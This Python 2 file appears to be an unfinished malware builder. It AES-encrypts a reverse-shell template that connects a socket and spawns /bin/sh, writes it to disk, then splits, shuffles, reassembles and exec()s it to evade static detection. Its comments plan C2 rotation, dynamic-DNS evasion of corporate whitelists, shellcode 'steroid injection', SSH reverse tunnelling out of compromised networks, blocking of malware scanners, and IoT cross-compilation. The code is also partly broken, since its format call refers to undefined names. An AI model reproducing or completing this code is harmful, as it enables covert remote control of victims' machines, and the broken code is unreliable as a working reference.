import re,random,string,Crypto,binascii
from Crypto.Cipher import AES
from binascii import hexlify

# This is a basic Python reverse shell. It needs to have the following features written beneath it. Particularly, TLS connections, DNS resolvers (to evade corporate DNS whitelists)
# Any deficiencies can be "plugged in" with a C2_Rotate command or a "steroid injection".
# Write it as separate .py files and then use the generator to read the modules in
template_reverse_shell = """
import socket,subprocess,os
{{DNS Resolver}}
{{Stub for randomly generated TLS certificate, no key or IV provided}}
{{Stub for decryption key and IV for payload itself}}
{{Stub for SSH Client}}
{{SocketServer}}
{{Preallocated Buffers for injections and C2_Rotates}}
{{DecryptorFunc}}
{{EncryptedPayload}}
{{DecryptorFuncCall(EncryptedPayload,decryptKey,decrypt,IV)}}
s=socket.socket(socket.AF_INET,socket.SOCK_STREAM)
s.connect(("127.0.0.1",1234))
os.dup2(s.fileno(),0)
os.dup2(s.fileno(),1)
os.dup2(s.fileno(),2)
p=subprocess.call(["/bin/sh","-i"])
""".format(
    str(DNS_Resolver),
    str(TLS_Cert),
    str(decryptKey),
    str(decryptIV),
    str(SSHClient),
    str(SocketServer),
    str(Buffers),
    str(DecryptorFunc),
    str(EncryptedPayload),
    str(DecryptorFuncCall)
)
template_reverse_shell = template_reverse_shell.strip().rstrip()
arrayList = []

# Add... Encrypted TLS Certificate Generation
# Replace reverse shell with TLS based variant
# Create a server.py that sends out the challenge string and IV
# 

# This module needs to be split into 2

# Payload has
# 1. Decryptor
# 2. Broken-apart shellcode generator (it's initially a encrypted payload, a whole entire payload,then a broken up set of cleartext strings, then reconstituted payload). The only thing written to the disk, at all, is the payload itself which is encrypted with a key and IV. Only dynamic analysis and debugging can catch it.
# 3. TLS Certificate (no decryption key, it is received from the reverse shell server)
# 4. Preallocated buffers that can be overwritten with injected shellcode (steroids), in C, Python, Java (Jython)
# 5. C2_Rotate Capability
# 6. DNS Resolver for dynamic DNS
# 7. Built in SSH Client, to allow for reverse tunneling out of compromised networks (home NATs for example), which acts as the tunnel to the SocketServer that allows "steroid injections", which allows dynamic upgrading of each any every shell.

# Server has
# 1. Generator keys, 32-bit key and 16-bit Initialization Vector, send in the format of key-IV
# 2. TLS Listener
# 3. IPTables perma-banner (if TLS negotiation fails, the shell is expected to auto-negotiate with the key and IV the correct TLS session, otherwise it is perma-banned with a IPTables rule. Prevents scanning from shodan malware hunter)
# 4. C2_Rotate-Push, auto-spins up a new IP address, then pushes a "upgrade" shell with new TLS certificates, new hostname and port, new keys to decrypt the payload
# 5. Cross Compiler, mainly C, Java/Jython, Cython, Objective-C, and targeting ARM and MIPS based IoT devices

def fillList(arrayBrokenShellCode,toFill):
    for i in range(0,toFill):
        arrayBrokenShellCode.append("aa")
    return arrayBrokenShellCode
def generateArrayList(l):
    # l = l.replace(r'\[','\\[').replace(r'\]','\\]').replace(r'\(','\\(').replace(r'\)','\\)')
    arrayBrokenShellCode = re.findall('..?',l)
#  x = map(lambda foo: foo.replace('a', 'b'), x), Example
    # x = map(lambda arrayBrokenShellCode: arrayBrokenShellCode[x].replace(r'[','\['),replace(r']','\]'),x)
#     # arrayBrokenShellCode = list(x)
# # for i, v in enumerate(x) :
# # x[i] = v.replace("a","b")
#     for v in enumerate(arrayBrokenShellCode):
#         # v = arrayBrokenShellCode[i]
#         # print v
#         i = arrayBrokenShellCode.index(v)
#         # print i,v
#         arrayBrokenShellCode[i] = v.replace("[","\[").replace("]","\]")
    # print arrayBrokenShellCode
    # for pair in arrayBrokenShellCode:
    #     pair = pair.replace(r"[","\[").replace(r"]","\]")
    arrayBSOrig = list(arrayBrokenShellCode)
    # print "DEBUG: ",arrayBSOrig
    toFill = 50 - len(arrayBrokenShellCode)
    arrayBrokenShellCode = fillList(arrayBrokenShellCode,toFill)
    arrayShuffled = random.sample(arrayBrokenShellCode,len(arrayBrokenShellCode))
    for i in arrayShuffled:
        if i == 'aa' or None:
            char = ''.join(random.choice(string.ascii_lowercase) for i in range(2))
            arrayShuffled[arrayShuffled.index(i)] = char
    return arrayShuffled,arrayBSOrig
scmap = []
def remap(arrayBSOrig,arrayShuffled):
    for word in arrayBSOrig:
        # print "Word query:\r\n",word
        mapped = arrayShuffled.index(word)
        scmap.append(mapped)
    return scmap
def reconstituteSC(arrayShuffled,scmap):
    cmd=""
    for index in scmap:
        # # print 'DEBUG: Value of Array of Index: \r\n{}'.format(str(index)),arrayShuffled
        cmd += arrayShuffled[index]
        # print "Command string built:\r\n",cmd
        # # print 'DEBUG: Value of cmd to be executed: \r\n{}'.format(str(cmd))
    cmd = cmd.strip().rstrip()
    print "Executing Command:\r\n{}".format(str(cmd))
    exec(cmd)
    return cmd

def reconstituteOrig(arrayBSOrig):
    # for 
    # cmd = ""
    shell=[]
    # for v in arrayBSOrig:
    #     cmd = "{}{}".format(str(cmd),str(v))
    # shell.append(cmd)
    for x in arrayBSOrig:
        cmd = ""
        try:
            cmd = "".join(x)
            shell.append(cmd)
        except:
            pass
    print shell
    for c in shell:
        cmd = c
        print "Executing Command:\r\n{}".format(str(cmd))
        exec(cmd)
    return

# def fuckthisshit(arrayBSOrig):
#     for x in arrayBSOrig:
#         sublist = x
#         for y in sublist:
#             cmd = "".join(y)
#             print cmd
#     return
def generateKey(size=32,chars=string.ascii_uppercase + string.digits):
    return ''.join(random.choice(chars) for x in range(size))

def generateIV(size=16,chars=string.ascii_lowercase + string.digits):
    return ''.join(random.choice(chars) for x in range(size))
def cryptor(shellcommands, key, IV):
    obj = AES.new(key,AES.MODE_CFB,IV)
    # #print "DEBUG: Shell Commands", shellcommands
    ciphertext = obj.encrypt(shellcommands)
    # #print "DEBUG: Ciphertext", ciphertext

    return ciphertext

def safeDecryptShellCommands(ciphertext, key, IV):
    obj3 = AES.new(key,AES.MODE_CFB,IV)
    plainTextCmd = obj3.decrypt(ciphertext)
    #print plainTextCmd

    return plainTextCmd

def writePayloadToFile(l_encrypted):
    payload = 'payload.txt'
    w = open(payload,'w+')
    w.write(l_encrypted)
    w.close()

    return payload

def executeEncryptedPayload(payload,decryptKey,decryptIV):
    r = open(payload,'r+')
    cryptedPayload = r.read()
    r.close()
    x = safeDecryptShellCommands(cryptedPayload,decryptKey,decryptIV)
    lines = x.splitlines()

    return lines

def main():
    decryptKey = generateKey()
    decryptIV = generateIV()
    
    # lines = template_reverse_shell.splitlines()
    l_encrypted = cryptor(template_reverse_shell,decryptKey,decryptIV)
    payload = writePayloadToFile(l_encrypted)
    out = hexlify(l_encrypted)
    print "DEBUG:\r\n{}".format(str(out))
    lines = executeEncryptedPayload(payload,decryptKey,decryptIV)
    print "DEBUG:\r\n{}".format(str(lines))

    for l in lines:
        arrayShuffled, arrayBSOrig = generateArrayList(l)
        # print "Shuffled array\r\n",arrayShuffled,"\r\nOriginal array\r\n",arrayBSOrig
        scmap = remap(arrayBSOrig,arrayShuffled)
        # reconstituteSC(arrayShuffled,scmap)
        # reconstituteOrig(arrayBSOrig)
        # fuckthisshit(arrayBSOrig)

        for l in lines:
            array = re.findall('..?',l)
            print array
            cmd = "".join(array)
            print "Reconstituted:\r\n",cmd
            print "DEBUG:Executing Command:\r\n{}".format(str(cmd))
            exec(cmd)
# Figure out why the fuck this doesn't work
# Its as if you got the array from the same function, it will work
# But if you got it from calling a different function, it doesn't work.
        # for x in arrayBSOrig:
        #     cmd = "".join(x)
        #     print cmd
        #     exec(cmd)
    return
main()
